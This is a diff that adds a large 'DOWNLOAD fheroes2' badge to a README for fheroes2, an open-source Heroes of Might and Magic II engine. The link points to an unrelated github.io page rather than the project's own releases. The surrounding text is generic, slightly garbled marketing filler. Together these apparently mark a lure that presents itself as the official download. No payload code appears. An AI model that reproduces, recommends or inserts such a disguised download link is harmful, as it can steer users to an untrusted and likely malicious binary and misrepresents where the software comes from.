@@ -30,6 +30,12 @@ fheroes2 recreates the Heroes of Might and Magic II engine from scratch, running
 
 Whether you're a newcomer or a veteran, fheroes2 provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download fheroes2](https://img.shields.io/badge/⬇_DOWNLOAD_fheroes2-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
